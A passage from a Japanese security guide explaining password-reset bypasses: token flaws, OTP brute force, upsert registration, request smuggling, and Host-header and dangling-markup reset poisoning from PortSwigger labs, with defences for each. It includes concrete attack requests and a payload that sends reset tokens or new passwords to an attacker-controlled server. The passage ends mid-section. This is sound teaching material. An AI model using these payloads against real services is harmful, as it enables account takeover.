見た目が酷似した異なるUnicodeコードポイントの文字（例えば通常のラテン文字 `o` と丸囲み文字 `ⓞ` (U+24DF)）を使って、既存ユーザーのメールアドレスやユーザー名と「表示上そっくり」だが内部表現は異なる値で新規アカウントを登録できてしまう場合がある。アプリケーション側でUnicode正規化（NFKC/NFKDなど、見た目が似た文字を統一表現に変換する処理)を通さずに文字列を比較・保存していると、フィルタ回避や、逆に「正規化後に衝突する」ことを悪用したなりすましが成立する。

```
被害者: demo@gmail.com
攻撃者: demⓞ@gmail.com   (o の代わりに Unicode の丸囲み文字 U+24DF)
```

**関連ツール**: Unisub（類似のUnicode文字候補を提案するツール）、Unicode pentester cheatsheet（既知の紛らわしい文字の一覧）。

**防御**: メールアドレス・ユーザー名の受け付け時にUnicode正規化を適用し、ASCII範囲外の紛らわしい文字（confusable文字）を拒否するか、正規化後の値で一意性を検証する。

> 出典: PayloadsAllTheThings: Account Takeover — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md

### 3. トークンそのものの強度・検証ロジックの問題

輸送経路と宛先が正しくても、トークン自体の生成・検証に欠陥があれば、攻撃者は正規の受信を経ずにトークンを入手または偽造できる。

#### 3.1 トークン生成パターンの予測可能性

推測可能な生成方法（タイムスタンプ、ユーザーID、メールアドレス、生年月日などから決定論的に導出される値）を使っていると、攻撃者は同じアルゴリズムを再現してトークンを事前計算できる。

**検証方法**: 複数のリセットリンクを短時間に連続で要求し、発行されたトークン列を比較する。同一トークンが出る、値が単調増加している、文字種が限定的（数字のみ・6文字未満など)である場合は、暗号学的に安全な乱数生成器（CSPRNG）を使っていない疑いが強い。

**ツール**: Burp Sequencer（トークンのランダム性を統計的に評価する機能）、Turbo Intruder（大量リクエストを高速並列送信してトークンサンプルを収集する拡張機能）。

UUIDについても注意が必要で、UUIDv1（MACアドレスとタイムスタンプから生成）は予測可能な場合があるため、`guidtool` のような解析ツールでUUIDのバージョンと予測可能性を確認する。ランダム性が必要な用途ではUUIDv4（暗号学的乱数ベース）を使うべきである。

**防御**: 暗号学的に安全な乱数生成器で十分な長さ（最低でも128ビット相当）のトークンを生成する。トークンはユーザーの識別子から逆算できない形にする。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

#### 3.2 期限切れトークンの再利用・検証不一致

UIレベル（フロントエンドのJavaScriptなど）では期限切れトークンを拒否していても、実際にパスワードを更新する最終的なAPIエンドポイントやJSON経由のリクエストでは期限チェックが漏れている、という「検証の二重実装のズレ」がしばしば見られる。攻撃者はUIを経由せず、直接最終エンドポイントに古いトークンを送りつけて検証をすり抜ける。

**防御**: トークンの有効期限検証はサーバー側の単一の場所（最終的にパスワードを更新する処理の直前）で必ず行い、UI側の制御に依存しない。

#### 3.3 ワンタイムトークンの競合状態（Race Condition）

多くの実装は「トークンを検証する」処理と「パスワードを更新してトークンを無効化する」処理を別々のステップで行っており、トークンの無効化がパスワード更新の完了後（あるいは非同期処理の後）にしか行われない場合、同一トークンで複数のリクエストをほぼ同時に送信すると、無効化が間に合わずに複数回受理されてしまう競合状態が生まれる。これはTOCTOU（Time-Of-Check to Time-Of-Use、検証時点と使用時点のずれ）の一種である。

**実証方法**:
- 同一のリセットリンクを2つのブラウザ（またはHTTPクライアント）で開き、ほぼ同時にパスワード変更リクエストを送信する。
- 同一トークンに対して異なる新パスワードを指定した並列POSTリクエストを送る。
- パスワード変更成功後、レスポンスのリダイレクトが返る前に同じトークンで再度リクエストを送る。

もし2回以上受理される、あるいは既に「使用済み」のはずのトークンが再度有効と判定されるなら、無効化処理がアトミック（不可分）に実行されていないことを意味する。

**防御**: トークンの検証・使用・無効化を単一のデータベーストランザクション内でアトミックに実行する（例えば「トークンが未使用であること」を条件にした `UPDATE ... WHERE token = ? AND used = false` の一発更新で行数が0なら拒否する、など）。複数のアプリケーションワーカー/プロセス間でも単一使用が保証される設計にする。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

#### 3.4 トークンとユーザーの紐付け分離バグ

リセットの最終ステップで `token` と `email`（または `user_id`）を別々のパラメータとして受け取り、サーバー側が「トークンが（どのアカウント向けであれ）有効なものか」だけを検証し、「そのトークンが本当にそのメールアドレス宛に発行されたものか」を検証していないケースがある。この場合、攻撃者は次の手順で任意アカウントを乗っ取れる。

```
ステップ1: 攻撃者は自分自身のアカウントに対して正規のパスワードリセットを要求し、
           有効な（自分宛の）トークンを取得する。
ステップ2: 最終的なリセットエンドポイントに対し、
           "token"には自分のトークンを、"email"（または"user_id"）には
           被害者のものを指定して送信する。
→ サーバーがトークンの単体としての有効性しか見ていない場合、
  被害者のパスワードが攻撃者の指定した値に書き換わる。
```

**防御**: トークンはサーバー側のレコードで発行時点から特定のアカウントIDに紐付けて保存し、検証時には「トークンが存在し、かつ有効期限内であること」に加えて「リクエスト中で指定された対象アカウントと、トークン発行時に記録したアカウントが一致すること」を必ず確認する。理想的には最終リクエストでは `email`/`user_id` をクライアントから受け取らず、トークンからサーバー側だけで対象ユーザーを解決する設計にする。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

#### 3.5 APIレスポンスでのトークン直接返却

パスワードリセットをリクエストした際のAPIレスポンスに、メール送信されるはずのトークンそのものが含まれてしまっているケースがある。

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"tempToken":"4f89a1c2...","tokenExpiry":"2026-09-22T10:00:00Z"}
```

これが成立すると、攻撃者は被害者のメールアドレスに対してリセットをリクエストするだけで、メール受信箱にアクセスすることなくその場でトークンを入手できる。REST APIのJSONレスポンスだけでなく、GraphQLのレスポンス、WebSocketメッセージ、バッチ処理エンドポイント、詳細すぎるエラーメッセージ（デバッグ情報にトークンが混入するなど）も同様の観点で確認すべきである。

**防御**: トークンはサーバー内部にのみ保持し、クライアントへのレスポンスには一切含めない。開発環境用のデバッグレスポンスが本番ビルドに混入していないか確認する。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

#### 3.6 トークン未生成・NULL値による検証バイパス

リクエストボディでトークンフィールドに `null` や空文字列を送ると、サーバー側のロジックが「トークンが指定されていない＝トークン検証をスキップ」という分岐に誤って入り込み、そのままパスワード変更を受理してしまうケースがある。特に新規アカウント作成直後のフロー（初期パスワード設定など）でこの種の検証漏れが起きやすい。

```json
{"user": {"email": "victim@example.com", "tempToken": null, "password": "NewP@ssw0rd!"}}
```

**防御**: トークンフィールドが存在しない・NULL・空文字列の場合は、リクエスト自体を即座に拒否する。トークンの有無で分岐するのではなく、「サーバー側に記録された有効なリセットリクエストが存在するか」を必ず確認する設計にする。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

#### 3.7 トークンブルートフォースとレート制限不足

トークンの文字数が短い、数字のみ、あるいはレート制限が存在しない場合、攻撃者はIPアドレスを回転させながらBurp Intruderなどで総当たりを行い、有効なトークンを発見できる。同様に、パスワードリセット要求自体にレート制限がないと、大量のリセットメールを送りつける「メール爆弾」も可能になる。

**防御**: アカウント単位・IPアドレス単位でのレート制限、一定回数の失敗でのアカウント一時ロックまたはCAPTCHA要求、不審な試行パターンの監視とアラート。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

### 4. OTP（ワンタイムパスワード）特有のバイパス

メールリンク型ではなく、SMS/メールで数桁のOTPコードを送る方式のリセット導線では、OTP自体の桁数の少なさから総当たりが現実的な脅威になる。

#### 4.1 セッション変更によるOTP試行回数リセット

OTPの誤入力回数をセッション（クッキーで識別されるサーバー側のカウンタ）に紐付けて制限している実装では、攻撃者がセッションクッキーを新しい値に差し替えるだけで試行回数カウンタがリセットされ、事実上無制限にブルートフォースできてしまう。

```python
# 疑似コード: セッションを都度張り替えて試行回数制限を回避する
headers["Cookie"] = "PHPSESSID=<新しいセッションID>"
# 4桁OTP（0000〜9999、最大10,000通り）を総当たり
```

4桁のOTPは1万通りしかなく、レート制限がボトルネックとして機能しなければ現実的な時間内に突破される。

**防御**: OTP試行回数の制限はセッションではなくアカウント（またはリセット要求そのもの）に紐付けてサーバー側で永続化する。OTPの桁数を6桁以上にし、数回の失敗でそのOTP自体を即座に無効化する。

> 出典: Reset/Forgotten Password Bypass — https://hacktricks.wiki/en/pentesting-web/reset-password.html

### 5. 認証前エンドポイントの設計不備

#### 5.1 `skipOldPwdCheck` 的なフラグによる認証回避

内部的な「パスワード変更」関数が、旧パスワードの確認を省略できる引数（例: `skipOldPwdCheck=true`）を持っており、本来は管理者用の内部呼び出し専用だったはずのこのモードが、外部から到達可能な未認証エンドポイントから呼び出せてしまうケースがある。

```php
// 脆弱パターン（疑似コード）
if ($request['action'] == 'change_password') {
    $current_user->change_password('oldpwd', $_POST['confirm_new_password'], true, true);
    // 第3・第4引数が true で skipOldPwdCheck 相当の動作になる
}
```

```http
POST /hub/rpwd.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=change_password&user_name=admin&confirm_new_password=NewP@ssw0rd!
```

この例では、本来リセットトークンや旧パスワードの確認が必須であるべき処理が、`user_name` パラメータだけを指定すれば通ってしまう。これは「内部再利用のために作った柔軟な関数が、外部公開エンドポイントの権限境界を飛び越えて呼び出されてしまう」典型的な設計ミスである。

**防御**: パスワード変更ロジックにおいて、認証済みの本人操作（旧パスワード確認）とトークンベースのリセット（リセットトークン必須）を明確に分離した別関数・別エンドポイントとして実装し、いずれの検証もスキップできる第三の経路を作らない。パスワード変更完了時には既存の全セッションを無効化する。

> 出典: PayloadsAllTheThings: Account Takeover — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md

#### 5.2 登録エンドポイントのUpsert（更新兼用）挙動

新規ユーザー登録用のエンドポイントが、内部的にはデータベースへの「upsert」（既存レコードがあれば更新、なければ挿入）として実装されていることがある。この場合、既に存在するメールアドレスで「新規登録」を試みると、実際には既存アカウントのパスワードが上書きされてしまう。

```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```

これは事実上、認証も本人確認も一切不要なパスワードリセットに等しい。「登録」と「更新」を同じコードパスで扱う実装上の簡略化が、認可の境界を消してしまう例である。

**防御**: 登録処理と更新処理を明確に分離し、登録エンドポイントでは対象メールアドレスが既存レコードと一致する場合は即座に拒否する（重複登録エラーとする）。

> 出典: PayloadsAllTheThings: Account Takeover — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md

### 6. リセット導線を「経由地」として悪用する複合攻撃

リセット導線自体に欠陥がなくても、周辺の脆弱性と組み合わせることでアカウント乗っ取りに至る経路がある。これらはリセット機能固有の脆弱性ではないが、テスト時には必ずリセット導線の文脈でも確認すべきものとしてPayloadsAllTheThingsが整理している。

#### 6.1 クロスサイトスクリプティング（XSS）経由

親ドメインまたは同一オリジンを対象にしたXSS（攻撃者が注入したスクリプトが被害者のブラウザ上でそのサイトの権限で実行される脆弱性）が存在すると、そのスクリプトからセッションクッキーやローカルストレージ中のトークンを盗み出し、リセット導線を経由せずに直接セッションを乗っ取れる。

#### 6.2 HTTPリクエストスマグリング経由

フロントエンドとバックエンドのHTTPパーサが、リクエストの境界（`Content-Length` と `Transfer-Encoding: chunked` の解釈の食い違いなど）を異なる基準で解釈することを利用し、本来は別々に処理されるべきリクエストを「密輸」して他ユーザーのリクエストに割り込ませる手法。

```
Transfer-Encoding: chunked
Host: something.com
Content-Length: 83

0

GET http://attacker.domain.tld HTTP/1.1
```

検証には `smuggler`（リクエストスマグリングの脆弱性有無を自動検出するツール）などが使われる。実際のバグバウンティ報告として、Slack・Zomatoに対する大規模アカウント乗っ取りの事例が公開されている（HackerOne report #737140、#771666）。

#### 6.3 CSRF経由のパスワード変更

パスワード変更エンドポイントにCSRFトークンの検証がない場合、被害者を悪意あるページに誘導し、自動送信されるフォームによって被害者自身のブラウザから（被害者のセッションクッキーを使って）パスワード変更リクエストを強制的に送信させられる。CSRFとその防御（SameSite Cookie、CSRFトークン、Origin/Refererの検証）については別章で詳述する。

#### 6.4 JWT改ざん

パスワード変更やリセット完了の認可にJWT（JSON Web Token）を使っている場合、ペイロード中のユーザーIDやメールアドレスを書き換えられないか、署名アルゴリズムの検証不備（`alg: none` の受理、HS256とRS256の混同によるアルゴリズム混乱攻撃など）がないかを確認する。

**防御（6.1〜6.4共通）**: これらは個別の章（XSS、CSRF、セッション管理、JWT）で詳述する対策がそのまま適用される。リセット導線のテストにおいても、単体の欠陥だけでなく周辺の脆弱性と組み合わせた侵入経路を常に想定する。

> 出典: PayloadsAllTheThings: Account Takeover — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md

### まとめ

パスワードリセット導線のバイパス手法は、大きく分けると次の4段階のどこかに欠陥が生じることで成立する。

1. **輸送経路の漏洩**（Referrer、Hostヘッダ投毒によるリンク差し替え）
2. **宛先決定ロジックの不備**（メールパラメータ汚染、IDOR、ユーザー名/Unicode衝突）
3. **トークン自体の強度・検証不備**（予測可能な生成、検証漏れ、競合状態、紐付け分離バグ、レスポンス漏洩、NULLバイパス、OTP総当たり）
4. **周辺エンドポイントの認可設計ミス**（内部フラグの外部到達、Upsert登録、XSS/スマグリング/CSRF/JWTとの複合)

監査を行う際は、この4段階それぞれについて「トークンはどこで生成され、どこを通り、誰に届き、どう検証され、いつ無効化されるか」を一つずつ図に起こして追跡すると、抜け漏れなく評価できる。

## ホストヘッダによるリセットポイズニングラボ

本節では、PortSwigger Web Security Academy が公開している「Host header attacks」カテゴリのうち、パスワードリセット機能を標的にした2つのラボ——(1) 基本的なパスワードリセット・ポイゾニング、(2) dangling markup（不完全なHTMLタグの注入によって後続のテキストを意図しない要素の一部として解釈させる手法）を組み合わせたポイゾニング——を扱う。両者はいずれも「Hostヘッダはクライアントが自由に書き換えられる値である」という前提をアプリケーションが軽視した結果、パスワードリセットのリンク（あるいはリセット後の新パスワードそのもの）が攻撃者の管理するサーバーへ流出してしまう、という構造を持つ。前章までに扱ったHostヘッダインジェクションの基礎（キャッシュポイズニングやルーティング混乱）と地続きの内容であり、ここでは「認証機能」という具体的な着地点に絞って仕組みを掘り下げる。

> ⚠️ 本節はラボの攻略手順（フラグ取得の具体的クリック列）そのものではなく、脆弱性の仕組み・検知方法・防御策を解説する目的で書かれている。実在サービス・本番環境への無許可の検証や破壊的な手順は行わないこと。

### 前提知識: パスワードリセットメールはなぜHostヘッダに依存してしまうのか

多くのWebアプリケーションは、パスワードリセット機能を実装する際に次のような流れを取る。

1. ユーザーが `POST /forgot-password` にメールアドレス（またはユーザー名）を送信する
2. サーバーはリセット用のワンタイムトークンを発行し、DBに保存する
3. サーバーは「トークン付きのリセットURL」を含むメールを送信する。このURLの組み立てに、しばしば**リクエストのHostヘッダの値**が使われる

3番目のステップが本節の核心である。開発者は「このリクエストを受けたホスト名 = 自分たちのアプリが動いているドメイン」という前提でURLを組み立てがちだが、HTTPの仕様上Hostヘッダはクライアント（ブラウザやツール）が任意に設定できるフィールドであり、フロントのWebサーバーやアプリケーションフレームワークがリバースプロキシ構成の柔軟性のために、環境変数のドメイン名をハードコードする代わりに実行時のHostヘッダを読んでURLを動的生成する設計（`$_SERVER['HTTP_HOST']` をそのまま使う、Django/Rails等のフレームワークで `request.get_host()` 系のヘルパーを使う、といった実装）を取ることが少なくない。この「実行時に受け取った未検証の値をそのままドメインとして信頼する」実装が、Hostヘッダインジェクションの温床になる。

### ラボ1: Basic password reset poisoning ── Hostヘッダを書き換えてトークンを窃取する

#### ラボの前提とゴール

このラボは、被害者ユーザー `carlos` が「メールに含まれるリンクを不用意にクリックする」という設定を持つ。攻撃者の目標は、`carlos` に発行されたパスワードリセット用トークンを、`carlos` 自身のメールボックスを覗くことなく取得し、そのトークンを使って `carlos` のアカウントを乗っ取ることである。

> 出典: Lab: Basic password reset poisoning — https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning

#### 攻撃の仕組み

まず攻撃者は、自分自身のアカウントで一度正規のパスワードリセットを実行し、Burp Suite等のプロキシでリクエストを観察する。典型的なリクエストは次のような形になる。

```
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

username=wiener
```

ここでこのリクエストを Burp Repeater に送り、Hostヘッダを攻撃者が制御するサーバー（PortSwiggerの演習環境では、各ユーザーに割り当てられる「Exploit Server」）のホスト名に書き換え、`username` パラメータを被害者 `carlos` に変更して再送する。

```
POST /forgot-password HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=carlos
```

サーバーはこのリクエストを受け取ると、`carlos` 宛にリセットメールを生成する。もしメール本文中のリセットURLの組み立てに件のHostヘッダをそのまま使っていれば、`carlos` のメールボックスに届くリンクは次のような形になる。

```
https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/forgot-password?temp-forgot-password-token=TOKEN-VALUE
```

`carlos` が「不用意にリンクをクリックするユーザー」であるため、このURLへアクセスすると、そのGETリクエストが攻撃者の管理するExploit Serverに届く。攻撃者はサーバーのアクセスログを確認し、URLのクエリパラメータ `temp-forgot-password-token` からトークン値を読み取ることができる。

```
GET /forgot-password?temp-forgot-password-token=a1b2c3d4e5f6... HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

最後に、攻撃者は自分自身が受け取った正規のリセットメール（自分のアカウントに対して発行されたもの）のURL構造をテンプレートとして使い、トークン部分だけを `carlos` から窃取した値に置き換えて `https://vulnerable-website.com/forgot-password?temp-forgot-password-token=<carlosのトークン>` にアクセスする。トークンがサーバー側で正しく `carlos` に紐づけられているため、このリクエストは「`carlos` 用のパスワードリセットフォーム」を有効化し、攻撃者は任意の新パスワードを設定してアカウントを乗っ取れる。

#### なぜこの攻撃が成立するのか（仕組みレベル）

この攻撃が成立する根本原因は2点に整理できる。

1. **Hostヘッダの真正性検証の欠如**: HTTPプロトコル上、Hostヘッダはクライアントが自由に設定できるフィールドである。TLS証明書のSNI（Server Name Indication）やリバースプロキシのルーティング設定と、アプリケーション層でメール生成に使うドメイン名を同一視してはならないが、多くの実装はこの区別をせず「リクエストが届いたということは、このHostヘッダの値が正しいドメインなのだろう」という暗黙の信頼を置いてしまう。
2. **トークンとクライアントコンテキストの結合が甘い**: リセットトークン自体はサーバー側で安全に生成・保存されていても、そのトークンを**どのドメインに送るか**という決定を、攻撃者が制御可能な値（Hostヘッダ）に委ねてしまっている。トークンの機密性は「推測不可能な乱数である」ことだけでは担保されず、「正しい配送先にしか届かない」ことも同時に満たす必要がある。

これは前章で扱った「パスワードリセットトークンの推測可能性」とは異なるクラスの脆弱性であり、トークン自体がどれほど強固な乱数であっても、**配送経路（メール本文のURL生成ロジック）がクライアント入力に汚染されていれば無意味になる**という点を強調しておきたい。

#### 防御

- パスワードリセットメールのURL生成には、Hostヘッダのような信頼できないリクエスト由来の値を使わず、サーバー側の設定ファイルや環境変数にハードコードされた正規ドメインのみを使用する。
- どうしても複数ドメイン（マルチテナント等）に対応する必要がある場合は、許可済みドメインのホワイトリストと照合し、一致しない場合はリクエストを拒否する。
- リバースプロキシ（nginx等）の段階で、フロントエンドが想定する正規のHostヘッダ以外のリクエストを弾く設定を入れることも多層防御として有効。

### ラボ2: Password reset poisoning via dangling markup ── サニタイズの隙間を突いて新パスワードごと窃取する

#### ラボの前提とゴール

このラボもゴールは `carlos` のアカウントへのログインだが、経路がラボ1より一段複雑である。この対象アプリでは、パスワードリセット時に発行される**新しいパスワードそのものがメール本文に平文で記載される**という設計上の弱点があり、かつメール本文はリッチテキスト（生HTML）として構成されるが、そのHTMLに対して十分なサニタイズ（悪意あるタグや属性を無害化する処理。ここでは典型的にはDOMPurifyのようなサニタイザが想定されるが、本ラボの被害者側メールクライアント相当の処理ではこれが効いていない）が適用されない。

> 出典: Lab: Password reset poisoning via dangling markup — https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

#### Dangling Markup Injection とは何か

dangling markup injection（宙ぶらりんマークアップ注入）とは、HTMLタグの開始だけを注入し、意図的に閉じないままにしておくことで、**その後に続く本来無関係なテキスト全体を、そのタグの属性値の一部として解釈させてしまう**手法である。典型例は `<img src="` や `<a href="` のように、引用符付き属性の開始だけを注入することで、それ以降にページ上へ出力される任意のテキスト（この場合はメール本文の残りの部分）が、ブラウザのHTMLパーサによって「その属性値の続き」として飲み込まれてしまう。XSS対策として `<script>` タグや `"` によるコンテキストエスケープの脱出は防がれていても、**タグを閉じずに開始だけを注入する**という攻撃はフィルタの抜け穴になりやすい。これは属性値の終端を検出する仕組み（次の引用符、あるいは要素の終わりのタグ）に依存しており、出力側でその引用符が正しくエスケープされていない限り、パーサは「どこまでが属性値か」を後続のマークアップ構造から機械的に判断するしかないためである。

#### 攻撃手順と仕組み

まず攻撃者は、ラボ1と同様にHostヘッダの検証不備を確認する。このラボでは、ドメイン名自体の差し替えに加えて**ポート番号を任意に付加できる**という、より緩いバリデーション（ドメイン文字列の完全一致だけをチェックし、ポート部分を無視・許容してしまう実装）が存在する。

```
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net:1
```

このリクエストが受理されることを確認したら、ポート番号の位置に dangling markup ペイロードを注入する。

```
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net:"><a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net?
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=carlos
```

サーバー側でメールテンプレートが（不十分なサニタイズしか経ずに）Hostヘッダの値をHTML属性（例えばメール内のロゴ画像や「ログイン」ボタンのリンク先を組み立てる `href` や `src` 属性）に埋め込んでいる場合、生成されるメールHTMLの一部は次のような構造になる。

```html
<a href="https://YOUR-LAB-ID.web-security-academy.net:"><a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net?">reset your password</a>
...（この後に続くメール本文。ここに新パスワードの平文が含まれる）...
```

ここで起きているのは次の連鎖である。

1. 注入したペイロードの `">` によって、元々の `<a href="...">` タグの属性値が途中で終端させられ、タグそのものが閉じられる。
2. 続く `<a href="//exploit-server.net?` によって、**閉じられていない新しいアンカータグ**が開始される。この `href` 属性値の引用符はまだ閉じられていない。
3. サニタイズ処理が施されない限り、このタグはそのままメール本文の残り（新パスワードの文字列や、その後に続く定型文）をすべて飲み込みながらレンダリングされる。HTMLパーサから見ると、次に登場する引用符やタグの閉じ括弧までが、すべて「攻撃者が指定した `href` 属性の値の続き」として解釈されてしまうためである。
4. 結果として、メールクライアント（またはメールをスキャンするセキュリティソフト）がこのリンクを自動的にプリフェッチ・訪問すると、**新パスワードを含むメール本文の残り全体がクエリ文字列としてリクエストURLに付与された状態で、攻撃者のExploit Serverへ送信される**。

```
GET /?<新パスワードを含むメール本文の残りが混入したクエリ文字列> HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

攻撃者はExploit Serverのアクセスログからこのリクエストを確認し、クエリ文字列に混入した新パスワードの平文を読み取る。最後に、その新パスワードと被害者のユーザー名 `carlos` を使って通常のログインフォームからログインすれば攻撃は完了する。トークンを奪って改めてリセット操作を行う必要すらない点が、ラボ1との構造上の違いである。

#### なぜこの攻撃が成立するのか（仕組みレベル）

この攻撃は単独の欠陥ではなく、3つの弱点が連鎖して初めて成立する複合的な脆弱性である点を理解しておきたい。

1. **Hostヘッダ検証の緩さ**: ドメイン名部分のみを検証し、コロン以降のポート番号部分を無検証で許容してしまうと、攻撃者は「検証済みに見えるドメイン文字列」に任意のペイロードを続けて注入する余地を得る。バリデーションが文字列の**前方一致**や**部分一致**で行われている場合に典型的に起きる。
2. **出力時のHTML属性エスケープの欠如**: Hostヘッダの値をHTML属性値として埋め込む際、二重引用符 `"` や `<` `>` をエスケープしていなければ、注入された文字列がマークアップ構造そのものを書き換える。これはHTMLインジェクション（限定的なXSSの一種）の典型的な発生パターンであり、コンテキストに応じたエスケープ（HTML属性値コンテキストでは `"` を `&quot;` に置換する等）が徹底されていないことに起因する。
3. **機密情報をメール本文に平文で載せる設計**: 新パスワードをメール本文に直接記載するという設計自体が、そもそもリスクの高いアンチパターンである。パスワードリセットの完了は「トークン付きURLへのアクセス」を要求するステップ（ラボ1の構成）にとどめ、新パスワードそのものをメールに載せないのが本来の設計であるべきで、この点が破られているために被害の実害（パスワード窃取）が dangling markup 単体よりも大きくなっている。

なお、メールクライアントや一部のセキュリティ製品（アンチウイルスのリンクスキャナ等）が、受信メール内のリンクを自動的に事前アクセス（プリフェッチ）する挙動を持つことも、この攻撃の実行可能性を高める一因である。被害者が能動的にリンクをクリックしなくても、自動スキャンだけでリクエストが飛び、パスワードが漏洩し得る。

#### 防御

- ラボ1の防御策（Hostヘッダをメール生成に使わない、厳密なホワイトリスト検証）を大前提としつつ、ホワイトリスト照合は**ドメイン名とポート番号を含めた完全一致**で行い、部分一致や前方一致を避ける。
- Hostヘッダなどユーザー制御可能な値をHTMLメール本文に埋め込む場合は、埋め込み先のコンテキスト（HTML属性値・HTMLテキストノード等）に応じた出力エスケープを必ず行う。可能であればテンプレートエンジンの自動エスケープ機能に一任し、生文字列の連結でHTMLを組み立てない。
- 生成したHTMLメールに対してDOMPurify等のサニタイザをサーバー側で適用し、未閉タグや不正なマークアップ構造を正規化・除去してから送信する。
- パスワードリセットの完了に必要な情報（新パスワードやトークン）は、メール本文に平文で載せず、期限付きの一度限りのURLパラメータとしてのみ配送し、URL自体もHTTPS経由でのみ有効化する。
- CSP（Content Security Policy）をメールクライアント側でサポートしている場合、あるいは自社が提供するWebメールビューアであれば、外部ドメインへの自動リクエストを制限するポリシーも多層防御として機能する。

### 2つのラボの位置づけの違い

| 観点 | Basic password reset poisoning | Password reset poisoning via dangling markup |
|---|---|---|
| 悪用する一次脆弱性 | Hostヘッダ検証の欠如そのもの | Hostヘッダ検証の緩さ + HTMLサニタイズ不備の複合 |
| 窃取対象 | リセットトークン | 新パスワードの平文そのもの |
| 攻撃完了までの追加操作 | 窃取したトークンで改めてリセットURLにアクセスする必要あり | 窃取した新パスワードで直接ログインするだけで完了 |
| 象徴的な教訓 | 「信頼できるドメイン名」はサーバー設定側で固定すべきで、リクエストから動的に導出してはならない | 単一の脆弱性ではなく、複数の弱い実装（緩いバリデーション・不十分なエスケープ・機微情報の平文送信）が連鎖すると被害が拡大する |

両ラボに共通するのは、「パスワードリセットというセキュリティクリティカルな機能ほど、クライアントから受け取れる値（Hostヘッダを含む）を信頼の起点にしてはならない」という原則である。次節では、この原則を踏まえた上で、パスワードリセット導線全体の設計・実装チェックリストを扱う。

## リセットポイズニング攻略ライトアップ

本節では、PortSwigger Web Security Academy の2つの代表的なラボ「Password reset poisoning」「Password reset poisoning via middleware」を題材にした3本のライトアップを読み解き、**パスワードリセットポイズニング（Password Reset Poisoning）** という攻撃手法の仕組みを、プロトコルレベル・実装レベルで理解する。前節までで扱った「トークンの強度」や「トークンの検証漏れ」とは異なり、ここで問題になるのは **リセットリンクの生成元（ドメイン）そのものを攻撃者が汚染（poison）できてしまう** という、より根本的な設計上の欠陥である。

### 1. 攻撃の全体像 — なぜ「リンクの宛先」を攻撃者が決められるのか

パスワードリセット機能の典型的な実装は、次のような流れになっている。

1. ユーザーが `/forgot-password` にメールアドレスまたはユーザー名を送信する。
2. サーバーはランダムなリセットトークンを発行し、DBに保存する。
3. サーバーは「リセットリンク」を組み立ててメール送信する。このとき多くの実装は、リンクのドメイン部分を **ハードコードせず、リクエストの `Host` ヘッダ（あるいはリバースプロキシが付与する `X-Forwarded-Host` ヘッダ）から動的に取得する**。

3番目のステップこそが脆弱性の核心である。`Host` ヘッダは本来「クライアントがどのバーチャルホスト宛にリクエストしたか」をサーバーに伝えるためのフィールドであり、**リクエストを送信する側（クライアント）が自由に書き換えられる値**である。にもかかわらず、多くのフレームワークは「自分自身の絶対URLを組み立てたい」という便利さから、この値をそのまま信用し、`https://{Host}/reset-password?token=...` のようなリンクを生成してしまう。

つまり攻撃者は、パスワードリセットの申請リクエストを送るときに `Host` ヘッダを **自分が管理するドメイン（exploit-server など）に書き換える** だけで、被害者に届くメール内のリセットリンクのドメインを攻撃者のサーバーに差し替えることができる。被害者がそのリンクをクリックすると、正規のトークン付きURLが **攻撃者のサーバーへのHTTPリクエストとしてログに残る**。攻撃者はそのログからトークンを回収し、今度は正規ドメイン側の `/reset-password?token=<盗んだトークン>` にアクセスすることで、被害者のパスワードを任意の値に変更できる。

この攻撃が成立するために必要な条件は3つに整理できる。

- サーバーがリセットリンクのドメインを `Host`（または `X-Forwarded-Host`）ヘッダから動的に構築している
- トークン自体は正規のフローで正しく発行される（トークンの強度は関係ない — 盗まれるのはトークンの「値」であって、生成ロジックの弱さではない）
- 被害者がメール中のリンクを一度クリックしてしまう（あるいはメールクライアントやセキュリティスキャナが自動でリンクをプリフェッチする場合はクリック不要になることもある）

### 2. Basic Password Reset Poisoning（CyberiumX / learnhacking.io）

PortSwigger の "Basic password reset poisoning" ラボと、それをなぞった2本のライトアップの内容を統合すると、攻撃手順は次のようになる。

#### 手順

1. Burp Suite の Proxy でブラウザの通信を傍受しながら、対象サイトの「パスワードを忘れた場合」フォームから、被害者のユーザー名（ラボでは固定ユーザー `carlos`）を入力して送信する。
2. Proxy history から `POST /forgot-password` のリクエストを見つけ、Repeater に送る。
3. Repeater 上で **`Host` ヘッダの値を、自分の Exploit Server（`https://exploit-xxxxx.exploit-server.net` のような、Burp が用意する攻撃者制御ドメイン）に書き換える**。

書き換え後のリクエストは概ね次の形になる。

